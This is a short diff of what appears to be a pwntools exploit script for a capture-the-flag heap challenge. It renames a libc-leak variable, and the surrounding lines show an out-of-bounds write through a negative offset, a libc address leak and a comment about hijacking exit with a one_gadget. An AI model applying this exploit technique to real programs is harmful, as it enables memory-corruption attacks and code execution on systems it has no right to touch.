@@ -55,8 +55,8 @@ add("a" * 1, 0 - checkfail_pool_offset, "b")
 add("a" * 1, 5 * 8, "b" * 8)
 show(1)
 
-libcsetvbuf_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
-libc.address = libcsetvbuf_offset - libc.symbols["printf"]
+libcprintf_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
+libc.address = libcprintf_offset - libc.symbols["printf"]
 success("libc address -> " + hex(libc.address))
 
 # exit -> onegadget
